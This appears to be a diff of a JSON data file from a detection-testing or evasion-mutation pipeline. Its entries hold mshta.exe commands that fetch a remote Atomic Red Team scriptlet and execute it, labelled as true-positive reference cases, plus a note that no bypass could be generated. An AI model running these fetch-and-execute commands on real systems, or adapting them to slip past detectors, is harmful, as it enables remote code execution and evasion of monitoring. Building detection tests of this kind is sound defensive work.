@@ -1,6 +1,14 @@
 [
   {
-    "output": "mshta.exe  javascript:a=GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct\").Exec();close()",
-    "explanation": "The original command is already a valid test case and does not require mutation for this assessment."
+    "output": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();",
+    "explanation": "This is the original true positive command and is not a bypass. It is included for reference."
+  },
+  {
+    "output": "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()",
+    "explanation": "This is the original true positive command and is not a bypass. It is included for reference."
+  },
+  {
+    "output": "",
+    "explanation": "No safe bypass command can be generated."
   }
 ]
